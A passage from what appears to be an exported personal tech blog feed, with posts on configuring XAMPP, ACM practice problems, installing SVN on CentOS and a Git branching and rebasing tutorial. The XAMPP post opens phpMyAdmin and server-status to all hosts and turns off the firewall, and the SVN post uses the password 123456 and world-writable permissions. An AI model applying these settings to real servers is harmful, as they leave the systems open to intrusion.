&#27880;&#24847;&#65306;&#22312;&#25191;&#34892;.run&#25991;&#20214;&#26102;&#26080;&#25552;&#31034;&#65292;&#21407;&#22240;&#26159;&#20320;&#36719;&#20214;&#19982;&#31995;&#32479;&#20301;&#25968;&#19981;&#23545;&#24212;&#65292;&#25442;&#25104;64&#25110;32&#20301;&#30340;&#25191;&#34892;&#23601;ok&#20102;配置访问相关路径/opt/lampp/&#20027;&#30446;&#24405;/opt/lampp/htdocs/xampp/&#32593;&#31449;&#23384;&#25918;&#30446;&#24405;/opt/lampp/etc/&#37197;&#32622;&#25991;&#20214;&#23384;&#25918;&#30446;&#24405;使外部网络能正常访问#vim /opt/lampp/etc/extra/httpd-xampp.conf&#25214;&#21040;&#20462;&#25913;&#65306;&lt;LocationMatch "^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))"&gt;#        Require local   #&#27880;&#37322;&#25481;       Order deny,allow  #&#28155;&#21152;       Allow from all    #&#28155;&#21152;&#65292;&#34920;&#31034;&#20801;&#35768;&#25152;&#26377;&#37117;&#33021;&#35775;&#38382;       ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var&lt;/LocationMatch&gt;启动服务/opt/lampp/lampp start就这么简单，用浏览器访问一下吧！2.3.2 注意事项2.3.3 当访问时，出现权限问题Access forbidden!New XAMPP security concept:Access to the requested object is only available from the local network.This setting can be configured in the file "httpd-xampp.conf".Error 403&#36825;&#20010;&#21407;&#22240;&#23601;&#26159;&#19978;&#38754;&#25552;&#21040;&#30340;&#20462;&#25913;httpd-xampp.conf&#25991;&#20214;&#65292;&#25913;&#20102;&#23601;&#33021;&#27491;&#24120;&#35775;&#38382;&#20102;&#12290;2.3.4 重启后不能启动xampp服务&#30001;&#20110;&#26029;&#30005;&#25110;&#20854;&#20182;&#21407;&#22240;&#65292;&#37325;&#21551;&#21518;&#26381;&#21153;&#27809;&#33021;&#24320;&#21551;&#65292;&#32593;&#31449;&#19981;&#33021;&#35775;&#38382;&#20102;a.&#36827;&#20837; /etc/init.d &#30446;&#24405;&#19979;&#65292;&#24314;&#31435; lampp.sh&#25991;&#20214;#vim lampp.shb.&#36755;&#20837;&#22914;&#19979;&#20869;&#23481;#!/bin/shcd /opt/lampp./lampp startc.&#26356;&#25913;&#25991;&#20214;&#26435;&#38480;#chmod 755 lampp.shd.&#32534;&#36753; /etc/rc.d/rc.local ,&#22312;&#26368;&#21518;&#19968;&#34892;&#21518;&#38754;&#21152;&#19978;:exec /etc/init.d/lampp.sh&#22914;&#27492;&#65292;&#24320;&#26426;&#23601;&#33021;&#21551;&#21160;xampp&#20102;&#12290;2.3.5 有时会因为防火墙原因，导致不能访问网站&#27492;&#26102;&#65292;&#25105;&#20204;&#21487;&#20197;&#20851;&#38381;&#38450;&#28779;&#22681;&#65292;&#24182;&#19988;&#37325;&#21551;&#21518;&#19981;&#24320;&#21551;chkconfig iptables off &#20851;&#38381;&#38450;&#28779;&#22681;systemctl stop firewalled.service --Centos&#20013;&#20351;&#29992;systemctl disable firewalled.service --&#37325;&#21551;&#21518;&#19981;&#24320;&#21551;&#38450;&#28779;&#22681;2.4 phpStudy3 Referencesapache 百度百科]]></content>
      <categories>
        
          <category> software </category>
        
          <category> web-server </category>
        
      </categories>
      <tags>
        
          <tag> Apache </tag>
        
          <tag> WampServer </tag>
        
          <tag> phpStudy </tag>
        
          <tag> XAMPP </tag>
        
          <tag> WAMP </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[ACM]]></title>
      <url>/algorithms/2014/10/21/acm/</url>
      <content type="text"><![CDATA[1 1～1001.1 A+B problem描述	此题为练手用题，请大家计算一下a+b的值.输入	输入两个数，a,b输出	输出a+b的值#include&lt;stdio.h&gt;int main(){        int a,b;        printf("&#35831;&#36755;&#20837;&#20004;&#20010;&#25972;&#25968;(&#29992;&#36887;&#21495;&#20998;&#38548;)&#65306;");        scanf("%d,%d",&amp;a,&amp;b);        printf("%d\n",a+b);}#include&lt;iostream&gt;using namespace std;int main(){        int a,b;        cin&gt;&gt;a&gt;&gt;b;        cout&lt;&lt;a+b&lt;&lt;endl;}1.2 括号配对问题描述	现在，有一行括号序列，请你检查这行括号是否配对。输入	第一行输入一个数N（0&lt;N&lt;=100）,表示有N组测试数据。后面的N行输入多组输入数据，每组输入数据都是一个字符串S(S的长度小于10000，且S不是空串），测试数据组数少于5组。数据保证S中只含有"[", "]", "(", ")" 四种字符输出	每组输入数据的输出占一行，如果该字符串中所含的括号是配对的，则输出Yes,如果不配对则输出No1.3 多边形重心问题描述	在某个多边形上，取n个点，这n个点顺序给出，按照给出顺序将相邻的点用直线连接， （第一个和最后一个连接），所有线段不和其他线段相交，但是可以重合，可得到一个多边形或一条线段或一个多边形和一个线段的连接后的图形； 	如果是一条线段,我们定义面积为0，重心坐标为（0,0）.现在求给出的点集组成的图形的面积和重心横纵坐标的和；输入	第一行有一个整数0&lt;n&lt;11,表示有n组数据；	每组数据第一行有一个整数m&lt;10000,表示有这个多边形有m个顶点；输出	输出每个多边形的面积、重心横纵坐标的和，小数点后保留三位；1.4 ASCII码排序描述	输入三个字符（可以重复）后，按各字符的ASCII码从小到大的顺序输出这三个字符。输入	第一行输入一个数N,表示有N组测试数据。后面的N行输入多组数据，每组输入数据都是占一行，有三个字符组成，之间无空格。输出	对于每组输入数据，输出一行，字符中间用一个空格分开。1.5 2 101~2002.1 3 201~3004 301~4005 题目来源南京理工大学 ACM ：http://acm.nyist.edu.cn]]></content>
      <categories>
        
          <category> algorithms </category>
        
      </categories>
      <tags>
        
          <tag> ACM </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Install SVN in Linux]]></title>
      <url>/software/linux/2014/10/15/using-svn/</url>
      <content type="text"><![CDATA[If you have questions, please send email to zrg1390556487@gmail.com.1 PrefaceI have always been fascinated website development. So, management and back up of code is very important. Last night, installed successfully SVN on linux. In fack,I have tried before,but did not write a decent note.Summarized today.2 Installing2.1 environmentLinux kernel version: 3.10.0 OS: CentOS 7software: subversion2.2 First Method: installing by source package2.2.1 Download and decompressionOfficial Site: https://www.visualsvn.comDowload:        1. wget http://subversion.tigris.org/downloads/subversion-1.6.1.tar.gz        2. wget http://subversion.tigris.org/downloads/subversion-deps-1.6.1.tar.gzDecompression command:        tar zxvf subversion-1.6.1.tar.gz        tar zxvf subversion-deps-1.6.1.tar.gz2.2.2 Compile and installCommand:        ./configure --prefix=/usr/local/svn/        make &amp;&amp; make install2.2.3 Add command of svn to pathComand:       echo "export PATH=$PATH:/usr/local/svn/bin/" &gt;&gt; /etc/profile       source /etc/profile2.3 Second Method: yum installyum install subversion mod_dav_svn3 Build warehouse of test3.1 BuildBuild root directory of svnmkdir -p /opt/svnBuild warehoust of testmkdir -p /opt/svn/svntest/svnadmin create /opt/svn/svntest/3.2 Configure1.To directory of configure,There are three file here.   cd /opt/svn/svntest/conf/authz: Configure file about setting permissions of users.passwd:  Configure file about setting username and password.svnserve.conf: Configure file about svn.2.svnserve.confvim svnserve.confedit:     [general]     anon-access = none     auth-access = write     password-db = passwd     authz-db = authz3.authzadd:    [svntest:/]    92csz.com = rw # add a user(92csz.com),read and write.4.passwdedit:    92csz.com = 123456 # password is 1234564 Start4.1 Start service of SVNsvnserve -d -r /opt/svn/4.2 Check servicenetstat -aux |grep svnrestult:        tcp 000.0.0.0:3690.0.0.0:*  LISTEN  8646/svnserve4.3 Change permission of userCommand:        chmod -R 775 /opt/svn/ or     chmod -R o+rw /opt/svn4.4 Test by clientOpen svn client(right),Enter IP address of svn server and warehouse nameexmple:       svn://192.168.120.166/svntest5 Apache and Subversion5.1 Add this config file to apacheLoadModule dav_svn_module     modules/mod_dav_svn.soLoadModule authz_svn_module   modules/mod_authz_svn.so&lt;Location /svn&gt;   DAV svn   SVNParentPath /var/www/unixmensvn   AuthType Basic   AuthName "Subversion repositories"   AuthUserFile /etc/svn-auth-users   Require valid-user&lt;/Location&gt;5.2 Create SVN usershtpasswd -cm /etc/svn-auth-users testuser15.3 Create and configure SVN repositorymkdir /var/www/unixmensvncd  /var/www/unixmensvnsvnadmin create repochown -R apache.apache repo# If you still have issues with SELinux Security please apply this: chcon -R -t httpd_sys_content_t /var/www/unixmensvn/repochcon -R -t httpd_sys_rw_content_t /var/www/unixmensvn/repo5.4 You can open the http and https on the file with thi wayfirewall-cmd --permanent --zone=public --add-service=httpfirewall-cmd --permanent --zone=public --add-service=httpsfirewall-cmd --reload5.5 Make trunk, branches and tags structure under repomkdir -p /tmp/svn-structure-template/{trunk,branches,tags}svn import -m "Initial repository" /tmp/svn-structure-template   file:///var/www/unixmensvn/repo/Adding         /tmp/svn-structure-template/branchesAdding         /tmp/svn-structure-template/tagsAdding         /tmp/svn-structure-template/trunkCommitted revision 1.Done!6 Question6.1 Problem 11.svn: Can’t open file ‘***/txn-current-lock’: Permission deniedSolve:      Severth(Vew 7th section).6.2 Problem 22.Happen "authorization failed" error clientSolve:      Check configure.### Evey establishment of a lirary need to be configured.This is very important.6.3 Problem 33.When committing,error:         post commit FS processing had error:         "sqlite:attempt to write a readonly database"Solve:      into /opt/svn/wp-job/db , there is a file "rep-cache.db"chown -R zrg.zrggroup rep-cache.db]]></content>
      <categories>
        
          <category> software </category>
        
          <category> linux </category>
        
      </categories>
      <tags>
        
          <tag> SVN </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Subversion、Git和GitHub]]></title>
      <url>/software/2014/07/28/revision-control/</url>
      <content type="text"><![CDATA[如果你有任何问题，可以发邮件到zrg1390556487@gmail.com。1 Subversion//官网地址http://subversion.apache.org/https://tortoisesvn.net/1.1 使用小技巧TortoiseSVN进行增量发布1.右键》选择TortoiseSVN-&gt;Show Log（显示日志）2.选中更新版本段》右键选择Compare revisions（版本比较）3.全选》右键选择Export selection to…（导出所选文件到…）2 Git2.1 Git vs SVNGit是分布式的，SVN不是；Git把内容按元数据方式存储，而SVN是按文件；Git分支与SVN的分支不同；Git没有一个全局的版本号，而SVN有；Git的内容完整性要优于SVN：Git内容存储使用的是SHA-1算法。。2.2 InstallationUbuntu 10.10(maverick) 及以上版本，Debian(squeeze) 及以上版本：$ sudo aptitude install git$ sudo aptitude install git-doc git-svn git-email gitkUbuntu 10.04(lucid) 及之前版本，Debian(lenny) 及之前版本：$ sudo aptitude install git-core$ sudo aptitude install git-doc git-svn git-email gitkRHEL、Fedora、CentOS:$ yum install git$ yum install git-svn git-email gitk安装完后，查看版本$ git --version2.3 Configuration设置 username 和 email$ git config --global user.name "your name" //配置用户名$ git config --global user.email "your_email@youremail.com" //配置邮箱中文支持//中文支持UTF-8：$ git config --global core.quotepath false//中文支持GBK：$ git config --global i18n.logOutputEncoding gbk//录入提交说明的字符集：$ git config --global i18n.commitEncoding gbk查看配置信息$ git config -l删除配置$ git config --unset --global user.name$ git config --unset --global user.email2.4 Add file: .gitignore以斜杠“/”开头表示目录；以星号“*”通配多个字符；以问号“?”通配单个字符以方括号“[]”包含单个字符的匹配列表；以叹号“!”表示不忽略(跟踪)匹配到的文件或目录；2.5 仓库(Repository)操作首先，在服务器端或本地存储仓库目录下，进行仓库的初始化：$ git init检出仓库// 仓库在本地$ git clone /path/to/repository// 仓库在远端$ git clone username@host:/path/to/repository$ git clone git@github.com:xxx/hello_world.git //GitHub每次需要改动时，首先，拉取仓库（分支）最新内容(update)$ git pull$ git pull orgion master如果欲将本地初始化的仓库连接到某个远程服务器：$ git remote add origin &lt;server&gt;$ git remote add origin https://github.com/zhaorengui/test.git //GitHub$ git push -u origin master删除文件// 删除本地仓库文件$ rm test.php// 从Git仓库中删除文件$ git rm test.php2.6 提交过程本地仓库由 git 维护的三棵“树”组成。第一个是你的工作目录，它持有实际文；第二个是 缓存区（Index），它像个缓存区域，临时保存你的改动；最后是 HEAD，指向你最近一次提交后的结果。Figure 1: 提交流程1Figure 2: 提交流程2假如我新增了某个功能，现在把它提交到暂存区。//单独提交某个文件$ git add &lt;filename&gt;//提交所有$ git add -A$ git add .额……突然想起还有某个地方要改动一下，撤销提交到暂存区的代码。// 撤销提交到暂存区的所有文件$ git reset$ git reset HEAD .// 撤销提交到暂存区的某个文件$ git reset HEAD --filename修改完遗漏功能后，再次提交了代码到暂存区，再提交到本地仓库分支。$ git commit -m "Description"//直接跳过暂存区提交$ git commit -a -m "Description"经过上一步操作后，又想起刚才提交到本地仓库分支的代码需要进一步优化，所以只能撤消 commit。//查看提交日志$ git log//执行撤销到上一个版本$ git reset --soft HEAD^$ git reset --soft HEAD~1//参数解释：--mixed: 不删除工作空间改动代码，撤销commit，并且撤销git add . 操作--soft: 不删除工作空间改动代码，撤销commit，不撤销git add . --hard: 删除工作空间改动代码，撤销commit，撤销git add . 注意：如果 commit 注释写错了，只是想改一下注释，只需要执行以下命令，注释写完后保存就 OK 了。$ git commit --amend推送到远端仓库$ git push$ git push origin master //master为分支名称压缩提交历史$ git rebase -i$ git rebase -i HEAD~2 //在历史记录中合并为一次完美的提交参考：https://blog.csdn.net/itfootball/article/details/44154121替换本地改动有的时候，本地文件不小心被删除或者内容被修改，此时，可通过如下命令从远程仓库获取替换，已添加到暂存区的改动以及新文件都不会受到影响。$ git checkout file 丢弃本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：$ git fetch origin$ git reset --hard origin/master2.7 分支2.7.1 理解分支Figure 3: 理解分支在 Git 中提交时，会保存一个提交（commit）对象，该对象包含一个指向暂存内容快照的指针，包含本次提交的作者等相关附属信息，包含零个或多个指向该提交对象的父对象指针：首次提交是没有直接祖先的，普通提交有一个祖先，由两个或多个分支合并产生的提交则有多个祖先。假设在工作目录中有三个文件，准备将它们暂存后提交。暂存操作会对每一个文件计算校验和（即第一章中提到的 SHA-1 哈希字串），然后把当前版本的文件快照保存到 Git 仓库中（Git 使用 blob 类型的对象存储这些快照），并将校验和加入暂存区域：$ git add README test.rb LICENSE$ git commit -m 'initial commit of my project'现在，Git 仓库中有五个对象：三个表示文件快照内容的 blob 对象；一个记录着目录树内容及其中各个文件对应 blob 对象索引的 tree 对象；一个包含指向 tree 对象（根目录）的索引和其他提交信息元数据的 commit 对象。Figure 4: 单个提交对象在仓库中的数据结构作些修改后再次提交，那么这次的提交对象会包含一个指向上次提交对象的指针（译注：即下图中的 parent 对象）。两次提交后，仓库历史会变成下图的样子：Figure 5: 多个提交对象之间的链接关系Git 中的分支，其实本质上仅仅是个指向 commit 对象的可变指针。在若干次提交后，你其实已经有了一个指向最后一次提交对象的 master 分支，它在每次提交的时候都会自动向前移动。Figure 6: 分支其实就是从某个提交对象往回看的历史那么，Git 又是如何创建一个新的分支的呢？比如新建一个 test 分支，可以使用 git branch 命令：$ git branch test这会在当前 commit 对象上新建一个分支指针，如图：Figure 7: 多个分支指向提交数据的历史那么，Git 是如何知道你当前在哪个分支上工作的呢？它保存着一个名为 HEAD 的特别指针。在 Git 中，它是一个指向你正在工作中的本地分支的指针（译注：将 HEAD 想象为当前分支的别名）。 运行git branch 命令，仅仅是建立了一个新的分支，但不会自动切换到这个分支中去，所以，我们依然还在 master 分支里，如图：Figure 8: HEAD 指向当前所在的分支要切换到其他分支，可以执行 git checkout 命令。切换到新建的 testing 分支：$ git checkout testing这样 HEAD 就指向了 testing 分支：Figure 9: HEAD 在你转换分支时指向新的分支不妨再提交一次：$ git commit -a -m 'made a change'提交后的结果：Figure 10: 每次提交后 HEAD 随着分支一起向前移动回到 master 分支看看：$ git checkout master这条命令做了两件事。它把 HEAD 指针移回到 master 分支，并把工作目录中的文件换成了 master 分支所指向的快照内容。也就是说，现在开始所做的改动，将始于本项目中一个较老的版本。它的主要作用是将 testing 分支里作出的修改暂时取消，这样你就可以向另一个方向进行开发。作些修改后再次提交：$ git commit -a -m 'made other changes'Figure 11: 不同流向的分支历史由于 Git 中的分支实际上仅是一个包含所指对象校验和（40 个字符长度 SHA-1 字串）的文件，所以创建和销毁一个分支就变得非常廉价。这和大多数版本控制系统形成了鲜明对比，它们管理分支大多采取备份所有项目文件到特定目录的方式，所以根据项目文件数量和大小不同，可能花费的时间也会有相当大的差别，快则几秒，慢则数分钟。而 Git 的实现与项目复杂度无关，它永远可以在几毫秒的时间内完成分支的创建和切换。同时，因为每次提交时都记录了祖先信息（译注：即parent 对象），将来要合并分支时，寻找恰当的合并基础（译注：即共同祖先）的工作其实已经自然而然地摆在那里了，所以实现起来非常容易。Git 鼓励开发者频繁使用分支，正是因为有着这些特性作保障。2.7.2 分支的创建与切换实际工作中大体也会用到这样的工作流程：正在开发某个网站；为实现某个新的需求，创建了一个分支；正在这个分支上开展工作。突然，接到一个电话说有个很严重的问题需要紧急修补，那么可以按照下面的方式处理：返回到原先已经发布到生产服务器上的分支。为这次紧急修补建立一个新分支，并在其中修复问题。通过测试后，回到生产服务器所在的分支，将修补分支合并进来，然后再推送到生产服务器上。切换到之前实现新需求的分支，继续工作。A.首先，我们假设你正在项目中愉快地工作，并且已经提交了几次更新：Figure 12: 一个简短的提交历史B.现在，你决定要修补问题追踪系统上的 #53 问题。（这里为了说明要解决的问题，才把新建的分支取名为 iss53。）$ git checkout -b iss53//这相当于执行下面这两条命令：$ git branch iss53$ git checkout iss53该命令执行结果：Figure 13: 创建了一个新分支（专门解决53问题）的指针在提交了若干次更新后，iss53 分支的指针也会随着向前推进。Figure 14: iss53 分支随工作进展向前推进C.现在你就接到了那个网站问题的紧急电话，需要马上修补。此时，确定你已经提交了所有的修改，接下来切换到 master 分支：$ git checkout master切换回主分支后，工作目录中的内容和你在解决问题 #53 之前一模一样，你可以集中精力进行紧急修补。特别注意：Git 会把工作目录的内容恢复为检出某分支时它所指向的那个提交对象的快照。它会自动添加、删除和修改文件以确保目录的内容和你当时提交时完全一样。创建一个紧急修补分支 hotfix 来开展工作，直到搞定：$ git checkout -b 'hotfix'Figure 15: hotfix 分支是从 master 分支所在点分化出来的D.测试，确保修补是成功的。然后回到 master 分支并把它合并进来，然后发布到生产服务器。用 git merge 命令来进行合并：$ git checkout master$ git merge hotfixUpdating f42c576..3a0874cFast forwardREADME |    1 -1 files changed, 0 insertions(+), 1 deletions(-)请注意，合并时出现了“Fast forward”的提示。由于当前 master 分支所在的提交对象是要并入的 hotfix 分支的直接上游，Git 只需把master 分支指针直接右移。换句话说，如果顺着一个分支走下去可以到达另一个分支的话，那么 Git 在合并两者时，只会简单地把指针右移，因为这种单线的历史分支不存在任何需要解决的分歧，所以这种合并过程可以称为快进（Fast forward）。Figure 16: 合并之后，master 分支和 hotfix 分支指向同一位置E.在那个超级重要的修补发布以后，你想要回到被打扰之前的工作。由于当前 hotfix 分支和 master 都指向相同的提交对象，所以hotfix 已经完成了历史使命，可以删掉了。使用 git branch 的 -d 选项执行删除操作：$ git branch -d &lt;BranchName&gt;删除远程分支(原理是把一个空分支push到server上，相当于删除该分支。)$ git push origin :&lt;BranchName&gt;F.现在回到之前未完成的 #53 问题修复分支上继续工作$ git checkout iss53Figure 17: iss53 分支可以不受影响继续推进2.7.3 分支的合并在问题 #53 相关的工作完成之后，可以合并回 master 分支。$ git checkout master$ git merge iss53请注意，这次合并操作的底层实现，并不同于之前 hotfix 的并入方式。如下图所示。由于当前 master 分支所指向的提交对象（C4）并不是 iss53 分支的直接祖先，Git 不得不进行一些额外处理。就此例而言，Git 会用两个分支的末端（C4 和 C5）以及它们的共同祖先（C2）进行一次简单的三方合并计算。Git 没有简单地把分支指针右移，而是对三方合并后的结果重新做一个新的快照，并自动创建一个指向它的提交对象（C6），见下图所示。Figure 18: Git 自动创建了一个包含了合并结果的提交对象既然之前的工作成果已经合并到 master 了，那么 iss53 也就没用了。你可以就此删除它，并在问题追踪系统里关闭该问题。$ git branch -d iss53遇到冲突时的分支合并有时候合并操作并不会如此顺利。如果在不同的分支中都修改了同一个文件的同一部分，Git 就无法干净地把两者合到一起（译注：逻辑上说，这种问题只能由人来裁决）。如果你在解决问题 #53 的过程中修改了hotfix 中修改的部分，将得到类似下面的结果：$ git merge iss53Auto-merging index.htmlCONFLICT (content): Merge conflict in index.htmlAutomatic merge failed; fix conflicts and then commit the result.Git 作了合并，但没有提交，它会停下来等你解决冲突。要看看哪些文件在合并时发生冲突，可以用 git status 查阅：$ git statusindex.html: needs merge# On branch master# Changed but not updated:#   (use "git add ..." to update what will be committed)#  (use "git checkout -- ..." to discard changes in working directory)##unmerged:   index.html任何包含未解决冲突的文件都会以未合并（unmerged）的状态列出。Git 会在有冲突的文件里加入标准的冲突解决标记，可以通过它们来手工定位并解决这些冲突。可以看到此文件包含类似下面这样的部分：&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD:index.htmlcontact : email.support@github.com=======please contact us at support@github.com&gt;&gt;&gt;&gt;&gt;&gt;&gt; iss53:index.html可以看到 ===== 隔开的上半部分，是 HEAD（即 master 分支，在运行merge 命令时所切换到的分支）中的内容，下半部分是在 iss53 分支中的内容。解决冲突的办法：手动合并；利用合并工具自动合并。自动合并，可以利用有图形界面的工具来解决，运行：$ git mergetoolmerge tool candidates: kdiff3 tkdiff xxdiff meld gvimdiff opendiff emerge vimdiffMerging the files: index.htmlNormal merge conflict for 'index.html':{local}: modified{remote}: modifiedHit return to start merge resolution tool (opendiff):不想用默认的合并工具，可以在上方”merge tool candidates”里找到可用的合并工具列表，输入你想用的工具名。再运行一次 git status 来确认所有冲突都已解决：$ git status如果确认所有冲突都已解决，也就是进入了暂存区，就可以用 git commit 来完成这次合并提交。提交的记录注释差不多是这样：Merge branch 'iss53'Conflicts:index.html## It looks like you may be committing a MERGE.# If this is not correct, please remove the file# .git/MERGE_HEAD# and try again.#如果想给将来看这次合并的人一些方便，可以修改该信息，提供更多合并细节。2.7.4 分支的管理git branch 命令不仅仅能创建和删除分支，如果不加任何参数，它会给出当前所有分支的清单：$ git branch//查看各个分支最后一个提交对象的信息$ git branch -v要从该清单中筛选出你已经（或尚未）与当前分支合并的分支，可以用 &#x2013;merge 和 &#x2013;no-merged 选项$ git branch --mergeiss53*master列表中没有 * 的分支通常都可以用 git branch -d 来删掉。原因很简单，既然已经把它们所包含的工作整合到了其他分支，删掉也不会损失什么。//查看尚未合并到当前分支的分支$ git branch --no-merged这样就显示还未合并进来的分支列表，如果此时用git branch -d 删除该分支会提示错误，因为那样做会丢失数据：$ git branch -d testingerror: The branch 'testing' is not an ancestor of your current HEAD.If you are sure you want to delete it, run 'git branch -D testing'.// 当然，你也可以用大写 -D 强制执行。2.7.5 实际开发工作流程长期分支由于 Git 使用简单的三方合并，所以就算在较长一段时间内，反复多次把某个分支合并到另一分支，也不是什么难事。也就是说，你可以同时拥有多个开放的分支，每个分支用于完成特定的任务，随着开发的推进，你可以随时把某个特性分支的成果并到其他分支中。许多使用 Git 的开发者都喜欢用这种方式来开展工作，比如仅在 master 分支中保留完全稳定的代码，即已经发布或即将发布的代码。与此同时，他们还有一个名为develop 或 next 的平行分支，专门用于后续的开发，或仅用于稳定性测试 — 当然并不是说一定要绝对稳定，不过一旦进入某种稳定状态，便可以把它合并到master 里。这样，在确保这些已完成的特性分支（短期分支，比如之前的 iss53 分支）能够通过所有测试，并且不会引入更多错误之后，就可以并到主干分支中，等待下一次的发布。本质上我们刚才谈论的，是随着提交对象不断右移的指针。稳定分支的指针总是在提交历史中落后一大截，而前沿分支总是比较靠前。Figure 19: 稳定分支总是比较老旧Figure 20: 想象成流水线可能会容易点特性分支特性分支是指一个短期的，用来实现单一特性或与其相关工作的分支。在 Git 中，一天之内建立、使用、合并再删除多个分支是常见的事。一个实际的例子：由下往上，起先我们在 master 工作到 C1，然后开始一个新分支 iss91 尝试修复 91 号缺陷，提交到 C6 的时候，又冒出一个解决该问题的新办法，于是从之前 C4 的地方又分出一个分支iss91v2，干到 C8 的时候，又回到主干 master 中提交了 C9 和 C10，再回到 iss91v2 继续工作，提交 C11，接着，又冒出个不太确定的想法，从 master 的最新提交 C10 处开了个新的分支dumbidea 做些试验。现在，假定两件事情：我们最终决定使用第二个解决方案，即 iss91v2 中的办法；另外，我们把 dumbidea 分支拿给同事们看了以后，发现它竟然是个天才之作。所以接下来，我们准备抛弃原来的iss91 分支（实际上会丢弃 C5 和 C6），直接在主干中并入另外两个分支。最终的提交历史将变成这样：注意：这些分支全部都是本地分支，这一点很重要。当你在使用分支及合并的时候，一切都是在你自己的 Git 仓库中进行的 — 完全不涉及与服务器的交互。2.7.6 远程分支一次 Git 克隆会建立你自己的本地分支 master 和远程分支 origin/master，它们都指向 origin/master 分支的最后一次提交。如果你在本地 master 分支做了些改动，与此同时，其他人向 git.ourcompany.com 推送了他们的更新，那么服务器上的master 分支就会向前推进。不过只要你不和服务器通讯，你的 origin/master 指针仍然保持原位不会移动。可以运行 git fetch origin 来同步远程服务器上的数据到本地。把另一个服务器加为远程仓库在本地有了一个指向 teamone 服务器上 master 分支的索引如果你有个叫 serverfix 的分支需要和他人一起开发，可以运行：// 推送本地分支$ git push origin serverfix// 跟踪远程分支从远程分支 checkout 出来的本地分支，称为_跟踪分支(tracking branch)。$ git checkout --track origin/serverfix// 删除远程分支在服务器上删除serverfix 分支，运行下面的命令：$ git push origin :serverfix//拉取远程仓库最新改动到本地仓库，执行：$ git pull2.7.7 分支的衍合把一个分支整合到另一个分支的办法有两种：merge 和 rebase（译注：rebase 的翻译暂定为“衍合”）基本的衍合操作回顾之前有关合并的章节，开发进程分叉到两个不同分支，又各自提交了更新。通过合并一个分支来整合分叉了的历史其实，还有另外一个选择：你可以把在 C3 里产生的变化补丁在 C4 的基础上重新打一遍。在 Git 里，这种操作叫做_衍合（rebase）。$ git checkout experiment$ git rebase master原理：回到两个分支最近的共同祖先，根据当前分支（也就是要进行衍合的分支 experiment）后续的历次提交对象（这里只有一个 C3），生成一系列文件补丁，然后以基底分支（也就是主干分支master）最后一个提交对象（C4）为新的出发点，逐个应用之前准备好的补丁文件，最后会生成一个新的合并提交对象（C3’），从而改写 experiment 的提交历史，使它成为 master 分支的直接下游，如图所示：现在回到 master 分支，进行一次快进合并Figure 21: master 分支的快进一般我们使用衍合的目的，是想要得到一个能在远程分支上干净应用的补丁 — 比如某些项目你不是维护者，但想帮点忙的话，最好用衍合：先在自己的一个分支里进行开发，当准备向主项目提交补丁的时候，根据最新的origin/master 进行一次衍合操作然后再提交，这样维护者就不需要做任何整合工作（译注：实际上是把解决分支补丁同最新主干代码之间冲突的责任，化转为由提交补丁的人来解决。），只需根据你提供的仓库地址作一次快进合并，或者直接采纳你提交的补丁。请注意，合并结果中最后一次提交所指向的快照，无论是通过衍合，还是三方合并，都会得到相同的快照内容，只不过提交历史不同罢了。衍合是按照每行的修改次序重演一遍修改，而合并是把最终结果合在一起。衍合举例衍合也可以放到其他分支进行，并不一定非得根据分化之前的分支。以下图为例，给服务器端代码添加一些功能而创建了特性分支 server，然后提交 C3 和 C4。然后又从 C3 的地方再增加一个client 分支来对客户端代码进行一些相应修改，所以提交了 C8 和 C9。最后，又回到 server 分支提交了 C10。Figure 22: 从一个特性分支里再分出一个特性分支的历史假设在接下来的一次软件发布中，我们决定先把客户端的修改并到主线中，而暂缓并入服务端软件的修改（因为还需要进一步测试）。把基于 server 分支而非 master 分支的改变（即 C8 和 C9），跳过 server 直接放到master 分支中重演一遍，但这需要用 git rebase 的 --onto 选项指定新的基底分支master：$ git rebase --onto master server client这好比在说：“取出 client 分支，找出 client 分支和 server 分支的共同祖先之后的变化，然后把它们在master 上重演一遍”。Figure 23: 将特性分支上的另一个特性分支衍合到其他分支现在可以快进 master 分支了$ git checkout master$ git merge clientFigure 24: 快进 master 分支，使之包含 client 分支的变化现在我们决定把 server 分支的变化也包含进来。$ git rebase master server于是，server 的进度应用到 master 的基础上：Figure 25: 在 master 分支上衍合 server 分支然后就可以快进主干分支 master 了：$ git checkout master$ git merge server现在 client 和 server 分支的变化都已经集成到主干分支来了，可以删掉它们了。$ git branch -d client$ git branch -d serverFigure 26: 最终的提交历史衍合的风险奇妙的衍合也并非完美无缺，要用它得遵守一条准则：一旦分支中的提交对象发布到公共仓库，就千万不要对该分支进行衍合操作。用一个实际例子来说明为什么公开的衍合会带来问题。假设你从一个中央服务器克隆然后在它的基础上搞了一些开发，提交历史类似下图所示：Figure 27: 克隆一个仓库，在其基础上工作一番现在，某人在 C1 的基础上做了些改变，并合并他自己的分支得到结果 C6，推送到中央服务器。当你抓取并合并这些数据到你本地的开发分支中后，会得到合并结果 C7，历史提交会变成：Figure 28: 抓取他人提交，并入自己主干接下来，那个推送 C6 上来的人决定用衍合取代之前的合并操作；继而又用 git push --force 覆盖了服务器上的历史，得到 C4’。而之后当你再从服务器上下载最新提交后，会得到：Figure 29: 有人推送了衍合后得到的 C4’，丢弃了你作为开发基础的 C4 和 C6下载更新后需要合并，但此时衍合产生的提交对象 C4’ 的 SHA-1 校验值和之前 C4 完全不同，所以 Git 会把它们当作新的提交对象处理，而实际上此刻你的提交历史 C7 中早已经包含了 C4 的修改内容，于是合并操作会把 C7 和 C4’ 合并为 C8Figure 30: 你把相同的内容又合并了一遍，生成一个新的提交 C8C8 这一步的合并是迟早会发生的，因为只有这样你才能和其他协作者提交的内容保持同步。而在 C8 之后，你的提交历史里就会同时包含 C4 和C4’，两者有着不同的 SHA-1 校验值，如果用git log 查看历史，会看到两个提交拥有相同的作者日期与说明，令人费解。而更糟的是，当你把这样的历史推送到服务器后，会再次把这些衍合后的提交引入到中央服务 器，进一步困扰其他人（译注：这个例子中，出问题的责任方是那个发布了 C6 后又用衍合发布 C4’ 的人，其他人会因此反馈双重历史到共享主干，从而混淆大家的视听。）。2.8 标签查看标签//显示所有标签$ git tag//查看 v4.0 系列的标签$ git tag -l v4.0.*//查看相应标签的版本信息$ git show 